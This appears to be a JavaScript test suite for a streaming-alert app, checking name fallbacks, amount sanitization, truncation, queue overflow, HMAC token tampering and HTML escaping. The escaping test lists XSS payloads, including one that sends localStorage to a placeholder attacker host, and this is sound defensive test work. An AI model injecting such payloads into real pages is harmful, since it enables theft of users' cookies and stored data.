/**
 * Tier 2: Boundary, Adversarial & Extreme Corner Case Tests
 * Grounded in: ORIGINAL_REQUEST.md (R2, R7) and PROJECT.md (Security Audits A & B, Features F05, F09, F42, F43)
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import {
  createMockStreamEvent,
  getPriorityQueueImplementation,
  getTokenServiceImplementation,
  initialsAvatar,
} from './helpers/testHarness.js';

describe('Tier 2: Boundary & Corner Cases', () => {

  // =========================================================================
  // 2.1 Empty & Malformed Sender Names
  // =========================================================================
  describe('2.1 Sender Name Boundary Cases & Fallbacks', () => {
    test('handles empty, whitespace, and null sender names with safe fallback', () => {
      const boundaryNames = ['', '   ', null, undefined, '\u200B\u200B\u200B', '\t\n'];

      for (const name of boundaryNames) {
        // Fallback initials avatar should never crash or throw
        const avatar = initialsAvatar(name);
        assert.ok(typeof avatar === 'string', `initialsAvatar should return data URI for "${name}"`);
        assert.ok(avatar.startsWith('data:image/svg+xml'), 'Should return valid SVG data URL');
      }
    });

    test('generates expected fallback initials for Arabic and Latin text', () => {
      const arabicAvatar = initialsAvatar('محمد نور');
      const decodedArabic = decodeURIComponent(arabicAvatar);
      assert.ok(decodedArabic.includes('م'), 'Arabic avatar should render first letter');

      const latinAvatar = initialsAvatar('Alex Mercer');
      const decodedLatin = decodeURIComponent(latinAvatar);
      assert.ok(decodedLatin.includes('A'), 'Latin avatar should render uppercase initial');
    });
  });

  // =========================================================================
  // 2.2 Zero, Negative & Non-Numeric Amounts
  // =========================================================================
  describe('2.2 Amount Sanitization & Currency Boundaries', () => {
    function sanitizeAmount(amount) {
      const num = Number(amount);
      if (isNaN(num) || !isFinite(num) || num < 0) {
        return 0;
      }
      return Math.round(num * 100) / 100; // Round to 2 decimal places
    }

    test('sanitizes zero, negative, and invalid numeric donation amounts', () => {
      assert.equal(sanitizeAmount(0), 0);
      assert.equal(sanitizeAmount(-50), 0, 'Negative amount must clamp to 0');
      assert.equal(sanitizeAmount(-0.001), 0);
      assert.equal(sanitizeAmount(NaN), 0, 'NaN must sanitize to 0');
      assert.equal(sanitizeAmount(Infinity), 0, 'Infinity must sanitize to 0');
      assert.equal(sanitizeAmount(-Infinity), 0);
      assert.equal(sanitizeAmount('invalid_string'), 0);
      assert.equal(sanitizeAmount(null), 0);
      assert.equal(sanitizeAmount(undefined), 0);
    });

    test('correctly preserves valid floating point donation amounts', () => {
      assert.equal(sanitizeAmount(4.99), 4.99);
      assert.equal(sanitizeAmount('250.50'), 250.50);
      assert.equal(sanitizeAmount(100000), 100000);
    });
  });

  // =========================================================================
  // 2.3 Extreme Character Counts & Buffer Safety
  // =========================================================================
  describe('2.3 Extreme Character Counts & Truncation Safety', () => {
    function sanitizeMessage(msg, maxLength = 250) {
      if (typeof msg !== 'string') return '';
      const trimmed = msg.trim();
      if (trimmed.length <= maxLength) return trimmed;
      return trimmed.slice(0, maxLength) + '...';
    }

    test('prevents memory or layout explosion on 10,000-character payload messages', () => {
      const massiveMessage = '🚀'.repeat(5000) + 'A'.repeat(5000);
      assert.equal(massiveMessage.length >= 10000, true);

      const sanitized = sanitizeMessage(massiveMessage, 250);
      assert.ok(sanitized.length <= 255, `Message should be truncated to safe length, got ${sanitized.length}`);
      assert.ok(sanitized.endsWith('...'), 'Truncated message should end with ellipsis');
    });

    test('handles 500-character usernames safely', () => {
      const longUsername = 'SuperStreamer_'.repeat(35);
      const avatar = initialsAvatar(longUsername);
      assert.ok(typeof avatar === 'string', 'Should safely compute avatar initials for 500-char name');
    });
  });

  // =========================================================================
  // 2.4 XSS & Injection Attack Neutralization
  // =========================================================================
  describe('2.4 Adversarial Injection & XSS Attack Neutralization', () => {
    function escapeHtml(str) {
      if (typeof str !== 'string') return '';
      return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    }

    test('escapes raw HTML script tags and javascript: URIs', () => {
      const attackVectors = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg onload=alert(document.cookie)>',
        'javascript:fetch("https://attacker.com?steal="+localStorage)',
        '<iframe src="https://evil.com"></iframe>',
      ];

      for (const vector of attackVectors) {
        const escaped = escapeHtml(vector);
        assert.equal(escaped.includes('<script>'), false, `Must not contain unescaped script tag: ${escaped}`);
        assert.equal(escaped.includes('<img'), false, `Must not contain unescaped img tag: ${escaped}`);
        assert.equal(escaped.includes('<iframe'), false, `Must not contain unescaped iframe tag: ${escaped}`);
        assert.ok(escaped.includes('&lt;') || escaped.includes('&quot;'), `Should contain entity escapes: ${escaped}`);
      }
    });

    test('handles complex Arabic diacritics and RTL directional override attacks', () => {
      const rtlAttack = '\u202E\u202Dمرحبا بالعالم\u202C\u202C';
      const event = createMockStreamEvent({
        sender: { name: rtlAttack },
        payload: { message: 'التبرع الأكبر لهذا العام 💰' },
      });

      assert.ok(event.sender.name.length > 0);
      assert.ok(event.payload.message.includes('التبرع الأكبر'));
    });
  });

  // =========================================================================
  // 2.5 Rapid 100-Event Queue Storm Stress Test
  // =========================================================================
  describe('2.5 Rapid 100-Event Queue Storm & Overflow Protection', () => {
    test('survives rapid storm of 100 events within 50ms without crashing or dropping critical alerts', async () => {
      const queue = await getPriorityQueueImplementation({ maxCapacity: 50, dedupWindowMs: 1000 });
      queue.pause();

      let overflowCount = 0;
      queue.on('queue_overflow', () => {
        overflowCount++;
      });

      // Enqueue 95 low-priority follow events
      for (let i = 0; i < 95; i++) {
        queue.enqueue(
          createMockStreamEvent({
            id: `storm_follow_${i}`,
            type: 'follow',
            priority: 4,
            sender: { name: `Follower_${i}` },
            payload: { message: `Follow #${i}` },
          })
        );
      }

      // Enqueue 5 critical priority 0 events amidst the storm
      for (let i = 0; i < 5; i++) {
        const accepted = queue.enqueue(
          createMockStreamEvent({
            id: `storm_critical_${i}`,
            type: 'donation',
            priority: 0,
            sender: { name: `CriticalWhale_${i}` },
            payload: { amount: 1000 * (i + 1), message: `Critical Alert #${i}` },
          })
        );
        assert.equal(accepted, true, `Critical event #${i} must never be rejected by overflow`);
      }

      assert.ok(overflowCount > 0, 'Queue overflow handler should have triggered');
      assert.ok(queue.size() <= 50, `Queue size must not exceed capacity (50), got ${queue.size()}`);

      // Verify the top 5 dequeued events are ALL the critical priority 0 events
      for (let i = 0; i < 5; i++) {
        const dequeued = queue.dequeue();
        assert.ok(dequeued, `Should have critical event dequeued at index ${i}`);
        assert.equal(dequeued.priority, 0, `Dequeued event must be Priority 0 (got ${dequeued.priority})`);
      }
    });
  });

  // =========================================================================
  // 2.6 Tampered & Corrupt OBS HMAC Tokens
  // =========================================================================
  describe('2.6 Tampered Token Security Verification', () => {
    test('strictly rejects tampered sceneId, tampered signature bytes, and altered exp', async () => {
      const tokenService = await getTokenServiceImplementation();
      const secret = 'prod_secret_salt_9988';
      const validToken = tokenService.generateToken('scene_obs_1', secret, 60000);

      // Verify valid token passes
      assert.equal(tokenService.verifyToken(validToken, secret).valid, true);

      // 1. Tamper signature byte
      const rawJson = JSON.parse(Buffer.from(validToken, 'base64url').toString('utf8'));
      const tamperedSigJson = { ...rawJson, sig: rawJson.sig.slice(0, -2) + 'ff' };
      const tamperedSigToken = Buffer.from(JSON.stringify(tamperedSigJson)).toString('base64url');
      const sigRes = tokenService.verifyToken(tamperedSigToken, secret);
      assert.equal(sigRes.valid, false);
      assert.equal(sigRes.reason, 'INVALID_SIGNATURE');

      // 2. Tamper sceneId (privilege escalation attempt)
      const tamperedSceneJson = { ...rawJson, sceneId: 'scene_admin_elevated' };
      const tamperedSceneToken = Buffer.from(JSON.stringify(tamperedSceneJson)).toString('base64url');
      const sceneRes = tokenService.verifyToken(tamperedSceneToken, secret);
      assert.equal(sceneRes.valid, false);
      assert.equal(sceneRes.reason, 'INVALID_SIGNATURE');

      // 3. Tamper expiration date (trying to extend expired token)
      const tamperedExpJson = { ...rawJson, exp: rawJson.exp + 100000000 };
      const tamperedExpToken = Buffer.from(JSON.stringify(tamperedExpJson)).toString('base64url');
      const expRes = tokenService.verifyToken(tamperedExpToken, secret);
      assert.equal(expRes.valid, false);
      assert.equal(expRes.reason, 'INVALID_SIGNATURE');
    });
  });
});
